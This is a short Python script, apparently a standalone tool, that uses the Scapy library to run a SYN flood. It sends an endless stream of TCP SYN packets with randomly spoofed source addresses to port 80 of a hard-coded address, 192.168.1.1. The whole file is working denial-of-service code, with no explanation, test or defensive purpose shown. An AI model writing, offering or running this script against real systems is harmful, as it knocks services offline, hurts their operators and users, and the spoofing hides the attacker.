from scapy.all import *
from scapy.layers.inet import TCP

target_ip="192.168.1.1"
target_port=80
i=1


def attack(target_ip,source_port,destination_port):
    source_addr=RandIP()
    packet=IP(src=source_addr,dst=target_ip)/TCP(sport=source_port,dport=destination_port,seq=1505066,flags="S")
    send(packet)

while True:
    attack(target_ip,1234,target_port)
    i+=1